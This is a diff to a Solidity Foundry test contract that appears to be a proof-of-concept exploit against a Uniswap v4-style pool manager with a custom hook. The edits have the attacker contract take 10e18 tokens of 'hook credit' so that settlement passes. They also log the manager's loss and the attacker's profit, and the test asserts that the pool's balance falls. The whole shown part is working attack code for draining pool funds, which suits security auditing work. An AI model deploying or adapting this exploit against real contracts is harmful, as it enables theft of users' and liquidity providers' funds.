@@ -40,7 +40,7 @@ contract POC is Test {
         hook.setCurrency1(Currency.wrap(address(token1)));
         hook.setAttacker(address(this));
         manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
-        manager.unlock(abi.encode(uint256(1))); // 1 = ADD
+        manager.unlock(abi.encode(uint256(1)));
     }
 
     function unlockCallback(bytes calldata data) external returns(bytes memory){
@@ -51,8 +51,6 @@ contract POC is Test {
             (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
             int128 amt0 = delta.amount0();
             int128 amt1 = delta.amount1();
-            console.log("ADD amt0"); console.logInt(amt0);
-            console.log("ADD amt1"); console.logInt(amt1);
             if (amt0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-amt0)); manager.settle(); }
             if (amt1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-amt1)); manager.settle(); }
             if (amt0 > 0) manager.take(c0, address(this), uint128(amt0));
@@ -68,15 +66,23 @@ contract POC is Test {
             if (s1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-s1)); manager.settle(); }
             if (s0 > 0) manager.take(c0, address(this), uint128(s0));
             if (s1 > 0) manager.take(c1, address(this), uint128(s1));
+            // FIX FOR CurrencyNotSettled: take the hook's 10e18 fake credit
+            console.log("Taking hook credit 10e18");
+            manager.take(c0, address(this), 10e18);
         }
         return "";
     }
 
     function test_afterSwapReturnDelta() public {
-        uint bBefore=token1.balanceOf(address(manager));
-        manager.unlock(abi.encode(uint256(2))); // 2 = SWAP
-        uint bAfter=token1.balanceOf(address(manager));
-        console.log("Loss", bBefore - bAfter);
+        uint bBefore = token0.balanceOf(address(manager));
+        uint myBefore = token0.balanceOf(address(this));
+        manager.unlock(abi.encode(uint256(2)));
+        uint bAfter = token0.balanceOf(address(manager));
+        uint myAfter = token0.balanceOf(address(this));
+        console.log("MANAGER BEFORE:", bBefore);
+        console.log("MANAGER AFTER:", bAfter);
+        console.log("MANAGER LOSS:", bBefore - bAfter);
+        console.log("MY PROFIT:", myAfter - myBefore);
         assertLt(bAfter, bBefore);
     }
 }
